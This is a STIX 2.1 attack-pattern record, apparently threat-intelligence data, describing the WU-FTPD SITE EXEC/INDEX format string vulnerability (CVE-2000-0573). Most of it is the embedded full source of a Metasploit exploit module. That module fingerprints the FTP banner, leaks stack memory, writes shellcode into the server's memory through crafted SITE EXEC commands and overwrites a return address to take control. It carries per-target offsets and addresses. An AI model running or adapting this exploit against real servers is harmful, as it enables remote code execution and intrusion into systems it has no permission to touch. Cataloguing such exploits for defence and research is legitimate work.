{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d298b633-79d5-4169-a7d6-b5f75b096515",
    "created": "2024-08-14T17:07:17.438296Z",
    "modified": "2024-08-14T17:07:17.4383Z",
    "name": "WU-FTPD SITE EXEC/INDEX Format String Vulnerability",
    "description": " This module exploits a format string vulnerability in versions of the Washington University FTP server older than 2.6.1. By executing specially crafted SITE EXEC or SITE INDEX commands containing format specifiers, an attacker can corrupt memory and execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/ftp/wuftpd_site_exec_format.rb",
            "external_id": "wuftpd_site_exec_format.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2000-0573"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Ftp\n  include Msf::Exploit::FormatString\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'WU-FTPD SITE EXEC/INDEX Format String Vulnerability',\n      'Description'    => %q{\n          This module exploits a format string vulnerability in versions of the\n        Washington University FTP server older than 2.6.1. By executing\n        specially crafted SITE EXEC or SITE INDEX commands containing format\n        specifiers, an attacker can corrupt memory and execute arbitrary code.\n      },\n      'Author'         => [ 'jduck' ],\n      'References'     =>\n        [\n          ['CVE', '2000-0573'],\n          ['OSVDB', '11805'],\n          ['BID', '1387']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'PrependChrootBreak' => true\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          # format string max length\n          'Space'    => 256,\n          # NOTE: \\xff's need to be doubled (per ftp/telnet stuff)\n          'BadChars' => \"\\x00\\x09\\x0a\\x0d\\x20\\x25\\x2f\",\n          'DisableNops'\t=>  'True',\n          'StackAdjustment' \t=> -1500\n        },\n      'Platform'       => [ 'linux' ],\n      'Targets'        =>\n      [\n        #\n        # Automatic targeting via fingerprinting\n        #\n        [ 'Automatic Targeting', { 'auto' => true }  ],\n\n        #\n        # specific targets\n        #\n        [\t'Slackware 2.1 (Version wu-2.4(1) Sun Jul 31 21:15:56 CDT 1994)',\n          {\n            'UseDPA' \t=> false,\n            'PadBytes'\t=> 3,\n            'NumPops' \t=> 8,\n            'AddrPops'  => 100,\n            'Offset'    => -2088, \t\t\t# offset to stack return\n            'Writable' \t=> 0xbfffde26, \t# stack, avoid badchars\n            'FlowHook'\t=> -1, # auto now... 0xbffff1e4\t\t# stack return addr\n          }\n        ],\n        # these aren't exploitable (using built-in, stripped down vsprintf, no %n)\n        #[\t'RedHat 5.2 (Version wu-2.4.2-academ[BETA-18](1) Mon Aug 3 19:17:20 EDT 1998)',\n        #[\t'RedHat 6.0 (Version wu-2.4.2-VR17(1) Mon Apr 19 09:21:53 EDT 1999)',\n        #[\t'RedHat 6.1 (Version wu-2.5.0(1) Tue Sep 21 16:48:12 EDT 1999)',\n        [\t'RedHat 6.2 (Version wu-2.6.0(1) Mon Feb 28 10:30:36 EST 2000)',\n          {\n            'UseDPA' \t=> true,\n            'PadBytes'\t=> 2,\n            'NumPops' \t=> 276,\n            'AddrPops'  => 2,\n            'Offset'    => -17664, \t\t\t# offset to stack return\n            'Writable' \t=> 0x806e726,\t\t# bss\n            #'Writable' \t=> 0xbfff0126,\t\t# stack, avoid badchars\n            'FlowHook'\t=> -1, # auto now... 0xbfffb028\t\t# stack return addr\n            #'FlowHook'  => 0x806e1e0\t\t# GOT of sprintf\n          }\n        ],\n\n        #\n        # this one will detect the parameters automagicly\n        #\n        [\t'Debug',\n          {\n            'UseDPA' \t=> false,\n            'PadBytes'\t=> 0,\n            'NumPops' \t=> 0,\n            'AddrPops'  => -1,\n            'Offset'    => -1,\n            'Writable' \t=> 0x41414242, \t#\n            'FlowHook'\t=> 0x43434545\t\t#\n          }\n        ],\n      ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => 'Jun 22 2000'))\n    register_options(\n      [\n        Opt::RPORT(21),\n      ])\n  end\n\n\n  def check\n    # NOTE: We don't care if the login failed here...\n    ret = connect_login\n\n    # We just want the banner to check against our targets..\n    vprint_status(\"FTP Banner: #{banner.strip}\")\n    status = Exploit::CheckCode::Safe\n    if banner =~ /Version wu-2\\.(4|5)/\n      status = Exploit::CheckCode::Appears\n    elsif banner =~ /Version wu-2\\.6\\.0/\n      status = Exploit::CheckCode::Appears\n    end\n\n    # If we've made it this far, we care if login succeeded.\n    if (ret)\n      # NOTE: vulnerable and exploitable might not mean the same thing here :)\n      if not fmtstr_detect_vulnerable\n        status = Exploit::CheckCode::Safe\n      end\n      if not fmtstr_detect_exploitable\n        status = Exploit::CheckCode::Safe\n      end\n    end\n\n    disconnect\n    return status\n  end\n\n\n  def exploit\n\n    if (not connect_login)\n      fail_with(Failure::Unknown, 'Unable to authenticate')\n    end\n\n    # Use a copy of the target\n    mytarget = target\n\n    if (target['auto'])\n      mytarget = nil\n\n      print_status(\"Automatically detecting the target...\")\n      if (banner and (m = banner.match(/\\(Version wu-(.*)\\) ready/))) then\n        print_status(\"FTP Banner: #{banner.strip}\")\n        version = m[1]\n      else\n        fail_with(Failure::NoTarget, \"No matching target\")\n      end\n\n      regexp = Regexp.escape(version)\n      self.targets.each do |t|\n        if (t.name =~ /#{regexp}/) then\n          mytarget = t\n          break\n        end\n      end\n\n      if (not mytarget)\n        fail_with(Failure::NoTarget, \"No matching target\")\n      end\n\n      print_status(\"Selected Target: #{mytarget.name}\")\n    else\n      print_status(\"Trying target #{mytarget.name}...\")\n      if banner\n        print_status(\"FTP Banner: #{banner.strip}\")\n      end\n    end\n\n    # proceed with chosen target...\n\n    # detect stuff!\n    if mytarget.name == \"Debug\"\n      #fmtstr_set_caps(true, true)\n      # dump the stack, so we can detect stuff magically\n      print_status(\"Dumping the stack...\")\n      stack = Array.new\n      extra = \"aaaabbbb\"\n      1000.times do |x|\n        dw = fmtstr_stack_read(x+1, extra)\n        break if not dw\n        stack << dw\n      end\n\n      stack_data = stack.pack('V*')\n      print_status(\"Obtained #{stack.length*4} bytes of stack data:\\n\" + Rex::Text.to_hex_dump(stack_data))\n\n      # detect the number of pad bytes\n      idx = stack_data.index(\"aaaabbbb\")\n      if not idx\n        fail_with(Failure::Unknown, \"Whoa, didn't find the static bytes on the stack!\")\n      end\n      num_pad = 0\n      num_pad = 4 - (idx % 4) if (idx % 4) > 0\n      mytarget.opts['PadBytes'] = num_pad\n\n      # calculate the number of pops needed to hit our addr\n      num_pops = (idx + num_pad) / 4\n      mytarget.opts['NumPops'] = num_pops\n    else\n      num_pad = mytarget['PadBytes']\n      num_pops = mytarget['NumPops']\n      sc_loc = mytarget['Writable']\n      ret = mytarget['FlowHook']\n    end\n\n    print_status(\"Number of pad bytes: #{num_pad}\")\n    print_status(\"Number of pops: #{num_pops}\")\n\n    # debugging -> don't try it!\n    return if mytarget.name == \"Debug\"\n\n    #print_status(\"ATTACH!\")\n    #select(nil,nil,nil,5)\n\n    fmtstr_detect_caps\n\n    # compute the stack return address using the fmt to leak memory\n    addr_pops = mytarget['AddrPops']\n    offset = mytarget['Offset']\n    if addr_pops > 0\n      stackaddr = fmtstr_stack_read(addr_pops)\n      print_status(\"Read %#x from offset %d\" % [stackaddr, addr_pops])\n      ret = stackaddr + offset\n    end\n\n    print_status(\"Writing shellcode to: %#x\" % sc_loc)\n    print_status(\"Hijacking control via %#x\" % ret)\n\n\n    # no extra bytes before the padding..\n    num_start = 0\n\n    # write shellcode to 'writable'\n    arr = fmtstr_gen_array_from_buf(sc_loc, payload.encoded, mytarget)\n\n    # process it in groups of 24 (max ~400 bytes per command)\n    sc_num = 1\n    while arr.length > 0\n      print_status(\"Sending part #{sc_num} of the payload...\")\n      sc_num += 1\n\n      narr = arr.slice!(0..24)\n\n      fmtbuf = fmtstr_gen_from_array(num_start, narr, mytarget)\n      # a space allows the next part to start with a '/'\n      fmtbuf[num_pad-1,1] = \" \"\n      fmtbuf.gsub!(/\\xff/, \"\\xff\\xff\")\n      if ((res = send_cmd(['SITE', 'EXEC', fmtbuf], true)))\n        if res[0,4] == \"500 \"\n          fail_with(Failure::Unknown, \"Something went wrong when uploading the payload...\")\n        end\n      end\n    end\n\n\n    # write 'writable' addr to flowhook (execute shellcode)\n    # NOTE: the resulting two writes must be done at the same time\n    print_status(\"Attempting to write %#x to %#x..\" % [sc_loc, ret])\n\n    fmtbuf = generate_fmt_two_shorts(num_start, ret, sc_loc, mytarget)\n    # a space allows the next part to start with a '/'\n    fmtbuf[num_pad-1,1] = \" \"\n    fmtbuf.gsub!(/\\xff/, \"\\xff\\xff\")\n    # don't wait for the response here :)\n    res = send_cmd(['SITE', 'EXEC', fmtbuf], false)\n\n    print_status(\"Your payload should have executed now...\")\n    handler\n  end\n\n\n  #\n  # these two functions are used to read stack memory\n  # (used by fmtstr_stack_read()\n  #\n  def trigger_fmt(fmtstr)\n    return nil if fmtstr.length >= (512 - (4+1 + 4+1 + 2 + 2))\n    send_cmd(['SITE', 'EXEC', 'x', fmtstr], true)\n  end\n\n  def extract_fmt_output(res)\n    if (res =~ /^5.. /)\n      #throw \"Crap! Something went wrong while dumping the stack...\"\n      return nil\n    end\n    ret = res.strip.split(/\\r?\\n/)[0]\n    ret = ret[6,ret.length]\n    return ret\n  end\n\n\nend\n",
    "x_mitre_disclosure_date": "Jun 22 2000",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}